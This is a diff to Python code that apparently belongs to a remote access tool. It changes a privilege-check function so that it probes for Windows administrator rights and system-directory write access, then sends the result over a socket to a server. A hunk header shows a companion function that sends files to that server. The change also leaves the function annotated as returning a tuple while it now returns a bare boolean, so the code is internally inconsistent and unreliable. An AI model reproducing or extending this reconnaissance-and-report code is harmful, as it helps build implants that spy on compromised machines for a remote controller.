@@ -167,13 +167,16 @@ def send_file_to_server(sock, file_path, max_size_mb=10):
         return "[!] Error"
 
 
-def check_admin_privileges() -> Tuple[bool, str]:
+def check_admin_privileges(socket) -> Tuple[bool, str]:
     try:
         if os.name == "nt":
             try:
                 is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                 if is_admin:
-                    return True, "[+] Administrator Privileges (Windows API Check)"
+                    socket_send(
+                        socket, "[+] Administrator Privileges (Windows API Check)"
+                    )
+                    return True
             except (AttributeError, OSError):
                 pass
 
@@ -186,7 +189,10 @@ def check_admin_privileges() -> Tuple[bool, str]:
             with open(test_file, "w") as f:
                 f.write("test")
             os.remove(test_file)
-            return True, "[+] Administrator Privileges (System Directory Access)"
+            socket_send(
+                socket, "[+] Administrator Privileges (System Directory Access)"
+            )
+            return True
         except (IOError, OSError, PermissionError) as e:
             if os.path.exists(test_file):
                 try:
@@ -194,8 +200,10 @@ def check_admin_privileges() -> Tuple[bool, str]:
                 except:
                     pass
             error_type = type(e).__name__
-            return False, f"[+] User Privileges (Access Denied: {error_type})"
+            socket_send(socket, f"[+] User Privileges (Access Denied: {error_type})")
+            return False
 
     except Exception as e:
         error_type = type(e).__name__
-        return False, f"[!] Privilege Check Error: {error_type}"
+        socket_send(socket, f"[!] Privilege Check Error: {error_type}")
+        return False
